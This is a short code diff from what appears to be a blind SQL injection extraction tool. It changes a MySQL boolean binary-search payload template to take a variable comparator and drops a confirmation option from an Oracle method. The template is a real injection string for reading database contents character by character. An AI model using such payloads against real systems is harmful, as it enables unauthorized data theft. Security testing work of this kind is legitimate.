@@ -120,8 +120,7 @@ def mysql_boolean_binary():
       encode_payload = quote,
       )
 
-
-  template = ' and ascii(substring((${query}),${char_pos},1))>${char_ord}'
+  template = ' and ascii(substring((${query}),${char_pos},1))${comparator}${char_ord}'
   return Method_binary(make_requester, template)
 
 def mysql_time():
@@ -278,7 +277,7 @@ def oracle_boolean():
       encode_payload = quote,
       )
 
-  return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5, confirm_char=True)
+  return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5)
 
 # TODO
 # def oracle_time():
